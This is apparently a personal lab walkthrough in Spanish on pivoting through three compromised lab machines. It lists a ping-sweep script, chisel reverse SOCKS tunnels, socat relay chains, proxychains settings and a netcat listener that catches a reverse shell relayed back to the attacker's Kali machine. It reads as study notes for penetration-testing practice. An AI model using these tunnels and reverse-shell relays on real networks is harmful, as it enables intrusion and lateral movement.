# Little Pivoting Example

Propietario: Adrian Gisbert Cabello

1. Abrimos instancia de kali con server chisel: `./chisel server --reverse -p 33`

![Untitled](Little%20Pivoting%20Example/Untitled.png)

1. Abrimos nueva instancia kali y rompemos la primera máquina
    
    2.1. Hacemos un escaneo de la red con el siguiente script:
    
    `#!/bin/bash for host in $(seq 1 254); do        timeout 1 bash -c "ping -c 1 20.20.20.$host &>/dev/null" && echo "[+] HOST - 20.20.20.$host"done; wait`
    
    2.2. Hacemos escaneo nmap, la rompemos y conseguimos acceso a la maquina1. Nos pasamos los archivos socat, chisel y el script de hosts desde la kali a la maquina1
    
2. hacemos un `hostname -I` para ver nuevas interfaces de red y usamos el script para ver nuevos equipos en la segunda interfaz de red
    
    3.1. activamos socat en la primera maquina como cliente: `./chisel client 10.10.10.1:33 R:socks`
    
    ![Untitled](Little%20Pivoting%20Example/Untitled%201.png)
    
    3.2. En la maquina atacante añadimos en el archivo `/etc/proxychains4.conf` lo siguiente: `socks5 127.0.0.1:1080`
    
    ![Untitled](Little%20Pivoting%20Example/Untitled%202.png)
    
    3.3. Nos aseguramos de que quede descomentada la linea de `dynamic` y comentada la de `strict`
    
    ![Untitled](Little%20Pivoting%20Example/Untitled%203.png)
    
3. Hacemos escaneo nmap, la rompemos y conseguimos acceso a la maquina2. Nos pasamos los archivos socat, chisel y el script de hosts desde la maquina1 a la maquina2
    
    4.1. Con el comando hostname -I y el script de hosts encontramos la máquina3
    
4. En la maquina1 activamos socat contra la máquina kali atacante: `./socat TCP-LISTEN:1111,fork TCP:10.10.10.1:33`
    
    5.1. En la maquina2 conectamos chisel en modo cliente contra la maquina1 al puerto 1111: `./chisel client 20.20.20.2:1111 R:1111:socks`
    
    5.2. En la maquina atacante añadimos en el archivo `/etc/proxychains4.conf` lo siguiente: `socks5 127.0.0.1:1111` (preferiblemente antes de la linea del otro socks5)
    
5. Hacemos escaneo nmap, la rompemos y conseguimos acceso a la maquina3. Nos pasamos los archivos socat, chisel y el script de hosts desde la maquina2 a la maquina3
    
    6.1. Con el comando hostname -I y el script de hosts no encontramos nada más.
    
    6.2. En la maquina2 nos ponemos en escucha con socat a traves del puerto 443 (que es el que nos vendrá la reverseshell): ./socat TCP-LISTEN:443,fork TCP:20.20.20.2:442
    
    6.3. En la maquina1 nos ponemos en escucha con socat a traves del puerto 442 (que es el que nos vendrá de la maquina1): ./socat TCP-LISTEN:442,fork TCP:10.10.10.1:441
    
    6.4. En la maquina kali atacante nos ponemos en escucha con netcat por el puerto 441: nc -lvnp 441
    
    6.5. En la maquina3 enviamos la reverseshell a la maquina2 (en la interfaz de red que está con la maquina3) por el puerto 443.
    
    6.6. En la maquina kali ya tenemos conexión directa con la maquina3
    

Así está bien ordenado:

![Untitled](Little%20Pivoting%20Example/Untitled%204.png)
